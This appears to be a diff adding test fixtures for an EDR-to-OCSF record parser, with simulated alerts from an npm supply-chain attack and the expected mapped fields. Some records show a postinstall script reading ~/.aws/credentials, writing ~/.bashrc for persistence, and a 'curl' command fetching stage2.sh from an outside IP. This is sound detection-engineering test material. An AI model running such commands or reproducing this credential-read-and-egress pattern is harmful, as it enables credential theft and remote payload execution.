+  - raw: "{\"v\":1,\"event_id\":\"01M1YHP0B33FCV271CB2NPRNKM\",\"host\":\"mars\",\"class\":\"alerts\",\"kind\":\"alert\",\"moat_tier\":\"gator\",\"severity\":\"critical\",\"@timestamp\":\"2026-09-07T18:22:12.727Z\",\"moat\":{\"v\":1,\"id\":\"01M1YHP0B33FCV271CB2NPRNKM\",\"ts\":\"2026-09-07T18:22:12.727Z\",\"severity\":\"critical\",\"rule\":\"moat-cred-cloud-credentials-read\",\"family\":\"cred\",\"title\":\"Cloud credentials read by an unexpected program\",\"summary\":\"node (pid 41233) read ~/.aws/credentials. Parent chain: systemd -> fish -> node -> sh -> node.\",\"process\":{\"pid\":41233,\"uid\":1000,\"exe\":\"/usr/bin/node\",\"args\":\"node setup.mjs\",\"cwd\":\"~/proj\",\"start_ts\":\"2026-09-07T18:22:12.727Z\",\"ancestry\":[{\"pid\":41200,\"exe\":\"/bin/sh\"},{\"pid\":41100,\"exe\":\"/usr/bin/node\"},{\"pid\":900,\"exe\":\"/usr/bin/fish\"}]},\"file\":{\"path\":\"~/.aws/credentials\",\"sha256\":null},\"explain\":{\"what\":\"node read ~/.aws/credentials.\",\"why\":\"...\",\"evidence\":[\"...\"],\"expected\":\"...\",\"next\":[\"...\"]},\"action_taken\":\"blocked\",\"actions\":[\"kill\",\"quarantine\",\"ignore\"],\"acked\":false,\"mode\":\"enforce\",\"actor\":{\"provenance\":\"user\",\"package\":null},\"context\":\"pkg-install\",\"severity_base\":\"high\",\"severity_reason\":\"high -> critical: pkg-install context\",\"surface\":\"alerts\",\"tier\":\"detection\",\"pkg_install_escalation\":true,\"suppressed_by\":null,\"rarity\":\"first_seen\",\"rarity_text\":\"first time seen here\",\"chain\":{\"v\":1,\"id\":\"CH-01\",\"families\":[\"cred\",\"net\"],\"severity\":\"critical\",\"severity_base\":\"high\",\"severity_reason\":\"...\",\"steps_total\":2,\"triggers_total\":2,\"span_secs\":3,\"truncated\":false,\"first_ts\":\"2026-09-07T18:22:12.727Z\",\"last_ts\":\"2026-09-07T18:22:12.727Z\",\"summary\":\"credential read then egress\",\"ancestor\":{\"pid\":41100,\"exe\":\"/usr/bin/node\"},\"members\":[\"01A\",\"01B\"],\"steps\":[{\"alert\":\"01A\",\"ts\":\"2026-09-07T18:22:12.727Z\",\"family\":\"cred\",\"rule\":\"moat-cred-cloud-credentials-read\",\"exe\":\"/usr/bin/node\",\"pid\":41233,\"role\":\"trigger\",\"severity\":\"high\",\"title\":\"...\"}]}}}"
+    expect:
+      "class_uid": 2004
+      "activity_id": 1
+      "disposition_id": 2
+      "finding_info.uid": "01M1YHP0B33FCV271CB2NPRNKM"
+      "metadata.version": "1.9.0"
+  - raw: "{\"v\":1,\"event_id\":\"01M1YHP0B33FCV271CB2NPRNKM.5e74dc7a5617\",\"host\":\"mars\",\"class\":\"alerts\",\"kind\":\"update\",\"moat_tier\":\"silt\",\"severity\":\"info\",\"@timestamp\":\"\",\"moat\":{\"v\":1,\"id\":\"01M1YHP0B33FCV271CB2NPRNKM\",\"update\":{\"acked\":true,\"acked_by\":\"dan\",\"ts\":\"2026-09-07T18:22:12.727Z\",\"count\":3,\"surface\":\"alerts\"}}}"
+    expect:
+      "class_uid": 2004
+      "activity_id": 2
+      "status_id": 4
+      "metadata.version": "1.9.0"
+  - raw: "{\"v\":1,\"event_id\":\"7983f8b39ff4\",\"host\":\"mars\",\"class\":\"alerts\",\"kind\":\"receipt\",\"moat_tier\":\"silt\",\"severity\":\"info\",\"@timestamp\":\"\",\"moat\":{\"v\":1,\"receipt\":{\"id\":\"01M1YGDTRRZYPAAGWYVX1DNHNZ\",\"root_exe\":\"/usr/bin/npm\",\"root_args\":\"npm install\",\"cwd\":\"~/proj\",\"started\":\"2026-09-07T18:22:12.727Z\",\"duration_s\":42,\"exit\":0,\"postinstall_scripts\":[\"~/proj/node_modules/evil/postinstall.js\"],\"writes_outside_project\":[\"~/.bashrc\"],\"network\":[\"185.220.101.55:4444\"],\"credential_reads\":[\"~/.aws/credentials\"],\"persistence_writes\":[\"~/.bashrc\"],\"execs_from_tree\":171,\"execs_from_tmp\":2}}}"
+    expect:
+      "class_uid": 1007
+      "activity_id": 2
+      "status_id": 1
+      "metadata.version": "1.9.0"
+  - raw: "{\"v\":1,\"event_id\":\"hb.mars.1788805336\",\"host\":\"mars\",\"class\":\"moat\",\"kind\":\"heartbeat\",\"severity\":\"info\",\"@timestamp\":\"2026-09-07T18:22:12.727Z\",\"moat\":{\"kind\":\"heartbeat\",\"ts\":\"2026-09-07T18:22:12.727Z\",\"version\":\"0.1.0\",\"classes\":[\"alerts\",\"network\"],\"transport\":\"https\",\"shipped\":412,\"dropped\":0,\"withheld\":1,\"backlog\":0,\"backlog_bytes\":0,\"last_ok\":\"2026-09-07T18:22:12.727Z\",\"last_error\":\"\"}}"
+    expect:
+      "class_uid": 6002
+      "activity_id": 99
+      "metadata.version": "1.9.0"
+  - raw: "{\"v\":1,\"event_id\":\"bWFycw==:1234567890:3661825.0123456789ab\",\"host\":\"mars\",\"class\":\"process\",\"kind\":\"exec\",\"moat_tier\":\"current\",\"severity\":\"info\",\"@timestamp\":\"2026-09-07T18:22:12.727Z\",\"moat\":{\"v\":1,\"class\":\"process\",\"kind\":\"exec\",\"ts\":\"2026-09-07T18:22:12.727Z\",\"exec_id\":\"bWFycw==:1234567890:3661825\",\"parent_exec_id\":\"bWFycw==:1234567000:2547388\",\"pid\":3661825,\"uid\":1000,\"auid\":1000,\"exe\":\"/usr/bin/node\",\"args\":\"node /home/dan/proj/node_modules/.bin/setup.mjs\",\"cwd\":\"~/proj\",\"start_time\":\"2026-09-07T18:22:12.723Z\"}}"
+    expect:
+      "class_uid": 1007
+      "activity_id": 1
+      "metadata.version": "1.9.0"
+  - raw: "{\"v\":1,\"event_id\":\"bWFycw==:1234567890:3661827.fedcba987654\",\"host\":\"mars\",\"class\":\"process\",\"kind\":\"exit\",\"moat_tier\":\"current\",\"severity\":\"info\",\"@timestamp\":\"2026-09-07T18:22:12.727Z\",\"moat\":{\"v\":1,\"class\":\"process\",\"kind\":\"exit\",\"ts\":\"2026-09-07T18:22:12.727Z\",\"exec_id\":\"bWFycw==:1234567890:3661827\",\"pid\":3661827,\"status\":137,\"signal\":9}}"
+    expect:
+      "class_uid": 1007
+      "activity_id": 2
+      "status_id": 2
+      "metadata.version": "1.9.0"
+  - raw: "{\"v\":1,\"event_id\":\"bWFycw==:1234567890:3661828.0123456789ab\",\"host\":\"mars\",\"class\":\"network\",\"kind\":\"connect\",\"moat_tier\":\"current\",\"severity\":\"info\",\"@timestamp\":\"2026-09-07T18:22:12.727Z\",\"moat\":{\"v\":1,\"class\":\"network\",\"kind\":\"connect\",\"ts\":\"2026-09-07T18:22:12.727Z\",\"dst_ip\":\"185.220.101.55\",\"dst_port\":4444,\"hook\":\"tcp_connect\",\"exec_id\":\"bWFycw==:1234567890:3661828\",\"parent_exec_id\":\"bWFycw==:1234567000:2547388\",\"pid\":3661828,\"uid\":1000,\"exe\":\"/usr/bin/curl\",\"args\":\"curl http://185.220.101.55:8080/stage2.sh\",\"cwd\":\"~/proj\",\"pkg_root\":\"/usr/bin/npm\"}}"
+    expect:
+      "class_uid": 4001
+      "activity_id": 1
+      "metadata.version": "1.9.0"
+  - raw: "{\"v\":1,\"event_id\":\"bWFycw==:1234567890:3661829.0123456789ab\",\"host\":\"mars\",\"class\":\"file\",\"kind\":\"file_write\",\"moat_tier\":\"current\",\"severity\":\"info\",\"@timestamp\":\"2026-09-07T18:22:12.727Z\",\"moat\":{\"v\":1,\"class\":\"file\",\"kind\":\"file_write\",\"ts\":\"2026-09-07T18:22:12.727Z\",\"path\":\"~/proj/node_modules/express/index.js\",\"verdict\":\"modify\",\"shape\":\"script\",\"bytes\":2048,\"sha256\":\"9f914d42706fe215501044acd85a32d58aaef1419d404fddfa5d3b48f66ccd9f\",\"exec_id\":\"bWFycw==:1234567890:3661829\",\"parent_exec_id\":\"bWFycw==:1234567000:2547388\",\"pid\":3661829,\"uid\":1000,\"exe\":\"/usr/bin/node\",\"args\":\"node payload.mjs\",\"cwd\":\"~/proj\",\"pkg_root\":null}}"
+    expect:
+      "class_uid": 1001
+      "activity_id": 3
+      "metadata.version": "1.9.0"
+  - raw: "{\"v\":1,\"event_id\":\"bWFycw==:1234567890:3661831.0123456789ab\",\"host\":\"mars\",\"class\":\"file\",\"kind\":\"file_chmod\",\"moat_tier\":\"current\",\"severity\":\"info\",\"@timestamp\":\"2026-09-07T18:22:12.727Z\",\"moat\":{\"v\":1,\"class\":\"file\",\"kind\":\"file_chmod\",\"ts\":\"2026-09-07T18:22:12.727Z\",\"path\":\"~/.local/bin/updater\",\"verdict\":\"chmod_x\",\"shape\":\"elf\",\"bytes\":184320,\"sha256\":\"aa11bb22cc33dd44ee55ff6600112233445566778899aabbccddeeff00112233\",\"exec_id\":\"bWFycw==:1234567890:3661831\",\"parent_exec_id\":\"bWFycw==:1234567000:2547388\",\"pid\":3661831,\"uid\":1000,\"exe\":\"/usr/bin/install\",\"args\":\"install -m755 updater ~/.local/bin/\",\"cwd\":\"~/proj\",\"pkg_root\":null}}"
+    expect:
+      "class_uid": 1001
+      "activity_id": 6
+      "metadata.version": "1.9.0"
+  - raw: "2026-09-07 not a moat record at all"
+    expect:
+      "class_uid": 2004
+      "activity_id": 99
+      "metadata.version": "1.9.0"
+  - raw: "{\"v\":1,\"event_id\":\"01M28N4RG9SEP7349KA2P7KNBN\",\"host\":\"mars\",\"class\":\"alerts\",\"kind\":\"alert\",\"moat_tier\":\"alert\",\"severity\":\"high\",\"@timestamp\":\"2026-09-11T16:44:03.512Z\",\"moat\":{\"v\":1,\"id\":\"01M28N4RG9SEP7349KA2P7KNBN\",\"ts\":\"2026-09-11T16:44:03.512Z\",\"severity\":\"high\",\"rule\":\"moat-x-net-domain-ioc\",\"family\":\"net\",\"title\":\"Connection to a domain on the local threat feed\",\"summary\":\"python3 connected to 83.79.212.211:443, resolved from skiimo.club.\",\"process\":{\"pid\":2874033,\"uid\":1000,\"exe\":\"/usr/bin/python3\",\"args\":\"python3 -c connect\",\"cwd\":\"~/proj\",\"start_ts\":\"2026-09-11T16:44:03.000Z\",\"ancestry\":[{\"pid\":2874000,\"exe\":\"/usr/bin/bash\",\"others_total\":223}]},\"net\":{\"dst_ip\":\"83.79.212.211\",\"dst_port\":443,\"domain\":\"skiimo.club\",\"domain_age_secs\":0,\"domain_queried_by\":\"/usr/bin/python3 (pid 2874033)\"},\"ioc\":{\"source\":\"domain-feed\",\"matched\":\"domain:skiimo.club\"},\"action_taken\":\"none\",\"actions\":[\"kill\",\"ignore\"],\"acked\":false,\"mode\":\"monitor\",\"actor\":{\"provenance\":\"official\",\"package\":\"python\"},\"context\":\"interactive\",\"severity_base\":\"high\",\"severity_reason\":\"high\",\"surface\":\"alerts\",\"tier\":\"detection\",\"suppressed_by\":null,\"rarity\":\"rare\",\"rarity_text\":\"rare\"}}"
+    expect:
+      "class_uid": 2004
+      "evidences.0.actor.process.name": "python3"
+      "evidences.0.actor.process.pid": 2874033
+      "evidences.0.query.hostname": "skiimo.club"
+      "osint.0.type_id": 2
+      "osint.0.value": "skiimo.club"
+      "osint.0.vendor_name": "domain-feed"
+      "enrichments.0.data.is_ioc": true
+      "enrichments.0.data.ioc_type": "domain"
+      "enrichments.0.value": "skiimo.club"
+      "enrichments.0.provider": "domain-feed"
+  - raw: "{\"v\":1,\"event_id\":\"01M28N4RG9SEP7349KA2P7KNBN\",\"host\":\"mars\",\"class\":\"alerts\",\"kind\":\"alert\",\"moat_tier\":\"alert\",\"severity\":\"high\",\"@timestamp\":\"2026-09-11T16:44:03.512Z\",\"moat\":{\"v\":1,\"id\":\"01M28N4RG9SEP7349KA2P7KNBN\",\"ts\":\"2026-09-11T16:44:03.512Z\",\"severity\":\"high\",\"rule\":\"moat-x-net-domain-ioc\",\"family\":\"net\",\"title\":\"Connection to a domain on the local threat feed\",\"summary\":\"python3 connected to 83.79.212.211:443, resolved from skiimo.club.\",\"process\":{\"pid\":2874033,\"uid\":1000,\"exe\":\"/usr/bin/python3\",\"args\":\"python3 -c connect\",\"cwd\":\"~/proj\",\"start_ts\":\"2026-09-11T16:44:03.000Z\",\"ancestry\":[{\"pid\":2874000,\"exe\":\"/usr/bin/bash\",\"others_total\":223}]},\"net\":{\"dst_ip\":\"83.79.212.211\",\"dst_port\":443,\"domain\":\"skiimo.club\",\"domain_age_secs\":91,\"domain_queried_by\":\"/usr/bin/firefox (pid 4242)\",\"domain_cname\":\"cdn.edge.example\"},\"ioc\":{\"source\":\"domain-feed\",\"matched\":\"domain:skiimo.club\"},\"action_taken\":\"none\",\"actions\":[\"kill\",\"ignore\"],\"acked\":false,\"mode\":\"monitor\",\"actor\":{\"provenance\":\"official\",\"package\":\"python\"},\"context\":\"interactive\",\"severity_base\":\"high\",\"severity_reason\":\"high\",\"surface\":\"alerts\",\"tier\":\"detection\",\"suppressed_by\":null,\"rarity\":\"rare\",\"rarity_text\":\"rare\"}}"
+    expect:
+      "class_uid": 2004
+      "evidences.0.actor.process.name": "firefox"
+      "evidences.0.actor.process.pid": 4242
+      "unmapped.dns.queried_by_self": false
+      "unmapped.dns.resolution_age_secs": 91
+      "unmapped.dns.cname": "cdn.edge.example"
+  - raw: "{\"v\":1,\"event_id\":\"01M28N4RG9SEP7349KA2P7KNBN\",\"host\":\"mars\",\"class\":\"alerts\",\"kind\":\"alert\",\"moat_tier\":\"alert\",\"severity\":\"high\",\"@timestamp\":\"2026-09-11T16:44:03.512Z\",\"moat\":{\"v\":1,\"id\":\"01M28N4RG9SEP7349KA2P7KNBN\",\"ts\":\"2026-09-11T16:44:03.512Z\",\"severity\":\"high\",\"rule\":\"moat-x-net-domain-ioc\",\"family\":\"net\",\"title\":\"Connection to a domain on the local threat feed\",\"summary\":\"python3 connected to 83.79.212.211:443, resolved from skiimo.club.\",\"process\":{\"pid\":2874033,\"uid\":1000,\"exe\":\"/usr/bin/python3\",\"args\":\"python3 -c connect\",\"cwd\":\"~/proj\",\"start_ts\":\"2026-09-11T16:44:03.000Z\",\"ancestry\":[{\"pid\":2874000,\"exe\":\"/usr/bin/bash\",\"others_total\":223}]},\"net\":{\"dst_ip\":\"83.79.212.211\",\"dst_port\":443},\"ioc\":null,\"action_taken\":\"none\",\"actions\":[\"kill\",\"ignore\"],\"acked\":false,\"mode\":\"monitor\",\"actor\":{\"provenance\":\"official\",\"package\":\"python\"},\"context\":\"interactive\",\"severity_base\":\"high\",\"severity_reason\":\"high\",\"surface\":\"alerts\",\"tier\":\"detection\",\"suppressed_by\":null,\"rarity\":\"rare\",\"rarity_text\":\"rare\"}}"
+    expect:
+      "class_uid": 2004
+      "evidences.0.query.hostname": "<missing>"
+      "evidences.0.actor.process.name": "<missing>"
+  - raw: "{\"v\":1,\"event_id\":\"01M28N4RG9SEP7349KA2P7KNBN\",\"host\":\"mars\",\"class\":\"alerts\",\"kind\":\"alert\",\"moat_tier\":\"alert\",\"severity\":\"high\",\"@timestamp\":\"2026-09-11T16:44:03.512Z\",\"moat\":{\"v\":1,\"id\":\"01M28N4RG9SEP7349KA2P7KNBN\",\"ts\":\"2026-09-11T16:44:03.512Z\",\"severity\":\"high\",\"rule\":\"moat-x-new-exec-ioc\",\"family\":\"exec\",\"title\":\"Connection to a domain on the local threat feed\",\"summary\":\"python3 connected to 83.79.212.211:443, resolved from skiimo.club.\",\"process\":{\"pid\":2874033,\"uid\":1000,\"exe\":\"/usr/bin/python3\",\"args\":\"python3 -c connect\",\"cwd\":\"~/proj\",\"start_ts\":\"2026-09-11T16:44:03.000Z\",\"ancestry\":[{\"pid\":2874000,\"exe\":\"/usr/bin/bash\",\"others_total\":223}]},\"net\":{\"dst_ip\":\"83.79.212.211\",\"dst_port\":443,\"domain\":\"skiimo.club\",\"domain_age_secs\":0,\"domain_queried_by\":\"/usr/bin/python3 (pid 2874033)\"},\"ioc\":{\"source\":\"hash-feed\",\"matched\":\"sha256:abababababababababababababababababababababababababababababababab\"},\"action_taken\":\"none\",\"actions\":[\"kill\",\"ignore\"],\"acked\":false,\"mode\":\"monitor\",\"actor\":{\"provenance\":\"official\",\"package\":\"python\"},\"context\":\"interactive\",\"severity_base\":\"high\",\"severity_reason\":\"high\",\"surface\":\"alerts\",\"tier\":\"detection\",\"suppressed_by\":null,\"rarity\":\"rare\",\"rarity_text\":\"rare\"}}"
+    expect:
+      "class_uid": 2004
+      "osint.0.type_id": 4
+      "osint.0.type": "Hash"
+      "osint.0.vendor_name": "hash-feed"
+      "enrichments.0.data.ioc_type": "hash"
+      "enrichments.0.data.matched_field": "file.sha256"
+  # NAN-3702 (existing sample): metadata.uid is sha256("moat_edr|raw|" + raw), so the
+  # same record parsed twice gets the same uid (a random uid could never match).
+  - raw: "2026-09-07 not a moat record at all"
+    expect:
+      "metadata.uid": "77573b4ac4d6759277abd90900f78a2d3073d86ee5eda6707ee07e7b278e760f"
+      "finding_info.uid": "77573b4ac4d6759277abd90900f78a2d3073d86ee5eda6707ee07e7b278e760f"
+  # NAN-3702 (natural id removed): metadata.uid is sha256("moat_edr|raw|" + raw), so the
+  # same record parsed twice gets the same uid (a random uid could never match).
+  - raw: "{\"v\":1,\"host\":\"mars\",\"class\":\"alerts\",\"kind\":\"receipt\",\"moat_tier\":\"silt\",\"severity\":\"info\",\"@timestamp\":\"\",\"moat\":{\"v\":1,\"receipt\":{\"root_exe\":\"/usr/bin/npm\",\"root_args\":\"npm install\",\"cwd\":\"~/proj\",\"started\":\"2026-09-07T18:22:12.727Z\",\"duration_s\":42,\"exit\":0,\"postinstall_scripts\":[\"~/proj/node_modules/evil/postinstall.js\"],\"writes_outside_project\":[\"~/.bashrc\"],\"network\":[\"185.220.101.55:4444\"],\"credential_reads\":[\"~/.aws/credentials\"],\"persistence_writes\":[\"~/.bashrc\"],\"execs_from_tree\":171,\"execs_from_tmp\":2}}}"
+    expect:
+      "metadata.uid": "89cdff524777bbe61593726fe078cdf8fdb20292691593176b287516e8342db9"
+      "actor.process.uid": "89cdff524777bbe61593726fe078cdf8fdb20292691593176b287516e8342db9"
+      "metadata.original_event_uid": "<missing>"
+  # NAN-3702 (natural id removed): metadata.uid is sha256("moat_edr|raw|" + raw), so the
+  # same record parsed twice gets the same uid (a random uid could never match).
+  - raw: "{\"v\":1,\"host\":\"mars\",\"class\":\"alerts\",\"kind\":\"alert\",\"moat_tier\":\"gator\",\"severity\":\"critical\",\"@timestamp\":\"2026-09-07T18:22:12.727Z\",\"moat\":{\"v\":1,\"ts\":\"2026-09-07T18:22:12.727Z\",\"severity\":\"critical\",\"rule\":\"moat-cred-cloud-credentials-read\",\"family\":\"cred\",\"title\":\"Cloud credentials read by an unexpected program\",\"summary\":\"node (pid 41233) read ~/.aws/credentials. Parent chain: systemd -> fish -> node -> sh -> node.\",\"process\":{\"pid\":41233,\"uid\":1000,\"exe\":\"/usr/bin/node\",\"args\":\"node setup.mjs\",\"cwd\":\"~/proj\",\"start_ts\":\"2026-09-07T18:22:12.727Z\",\"ancestry\":[{\"pid\":41200,\"exe\":\"/bin/sh\"},{\"pid\":41100,\"exe\":\"/usr/bin/node\"},{\"pid\":900,\"exe\":\"/usr/bin/fish\"}]},\"file\":{\"path\":\"~/.aws/credentials\",\"sha256\":null},\"explain\":{\"what\":\"node read ~/.aws/credentials.\",\"why\":\"...\",\"evidence\":[\"...\"],\"expected\":\"...\",\"next\":[\"...\"]},\"action_taken\":\"blocked\",\"actions\":[\"kill\",\"quarantine\",\"ignore\"],\"acked\":false,\"mode\":\"enforce\",\"actor\":{\"provenance\":\"user\",\"package\":null},\"context\":\"pkg-install\",\"severity_base\":\"high\",\"severity_reason\":\"high -> critical: pkg-install context\",\"surface\":\"alerts\",\"tier\":\"detection\",\"pkg_install_escalation\":true,\"suppressed_by\":null,\"rarity\":\"first_seen\",\"rarity_text\":\"first time seen here\",\"chain\":{\"v\":1,\"families\":[\"cred\",\"net\"],\"severity\":\"critical\",\"severity_base\":\"high\",\"severity_reason\":\"...\",\"steps_total\":2,\"triggers_total\":2,\"span_secs\":3,\"truncated\":false,\"first_ts\":\"2026-09-07T18:22:12.727Z\",\"last_ts\":\"2026-09-07T18:22:12.727Z\",\"summary\":\"credential read then egress\",\"ancestor\":{\"pid\":41100,\"exe\":\"/usr/bin/node\"},\"members\":[\"01A\",\"01B\"],\"steps\":[{\"alert\":\"01A\",\"ts\":\"2026-09-07T18:22:12.727Z\",\"family\":\"cred\",\"rule\":\"moat-cred-cloud-credentials-read\",\"exe\":\"/usr/bin/node\",\"pid\":41233,\"role\":\"trigger\",\"severity\":\"high\",\"title\":\"...\"}]}}}"
+    expect:
+      "metadata.uid": "aaccc79367801240320373e4b7624d71f846aa09c832eee18a7871e565a2a653"
+      "finding_info.uid": "aaccc79367801240320373e4b7624d71f846aa09c832eee18a7871e565a2a653"
+      "metadata.original_event_uid": "<missing>"
+  # NAN-3702 (natural id removed): metadata.uid is sha256("moat_edr|raw|" + raw), so the
+  # same record parsed twice gets the same uid (a random uid could never match).
+  - raw: "{\"v\":1,\"host\":\"mars\",\"class\":\"alerts\",\"kind\":\"update\",\"moat_tier\":\"silt\",\"severity\":\"info\",\"@timestamp\":\"\",\"moat\":{\"v\":1,\"update\":{\"acked\":true,\"acked_by\":\"dan\",\"ts\":\"2026-09-07T18:22:12.727Z\",\"count\":3,\"surface\":\"alerts\"}}}"
+    expect:
+      "metadata.uid": "7af8111bea0d38b577305db99c511f1a5dada33c45e6127bb6dd90c73dacbd9e"
+      "finding_info.uid": "7af8111bea0d38b577305db99c511f1a5dada33c45e6127bb6dd90c73dacbd9e"
+      "metadata.original_event_uid": "<missing>"
+  # NAN-3702 (natural id removed): metadata.uid is sha256("moat_edr|raw|" + raw), so the
+  # same record parsed twice gets the same uid (a random uid could never match).
+  - raw: "{\"v\":1,\"host\":\"mars\",\"class\":\"digest\",\"kind\":\"weekly\",\"moat_tier\":\"current\",\"severity\":\"info\",\"@timestamp\":\"2026-09-07T18:22:12.727Z\",\"moat\":{\"v\":1,\"class\":\"digest\",\"kind\":\"weekly\",\"ts\":\"2026-09-07T18:22:12.727Z\"}}"
+    expect:
+      "metadata.uid": "67e2b1cb86f0af4b9bd7c101b0534293db4a5f3560604251bbfb7a93809bc840"
+      "finding_info.uid": "67e2b1cb86f0af4b9bd7c101b0534293db4a5f3560604251bbfb7a93809bc840"
+      "metadata.original_event_uid": "<missing>"
+  # NAN-3718: the envelope event_id is the native id
+  - raw: "{\"v\":1,\"event_id\":\"bWFycw==:1234567890:3661825.0123456789ab\",\"host\":\"mars\",\"class\":\"process\",\"kind\":\"exec\",\"moat_tier\":\"current\",\"severity\":\"info\",\"@timestamp\":\"2026-09-07T18:22:12.727Z\",\"moat\":{\"v\":1,\"class\":\"process\",\"kind\":\"exec\",\"ts\":\"2026-09-07T18:22:12.727Z\",\"exec_id\":\"bWFycw==:1234567890:3661825\",\"parent_exec_id\":\"bWFycw==:1234567000:2547388\",\"pid\":3661825,\"uid\":1000,\"auid\":1000,\"exe\":\"/usr/bin/node\",\"args\":\"node /home/dan/proj/node_modules/.bin/setup.mjs\",\"cwd\":\"~/proj\",\"start_time\":\"2026-09-07T18:22:12.723Z\"}}"
+    expect:
+      "metadata.original_event_uid": "bWFycw==:1234567890:3661825.0123456789ab"
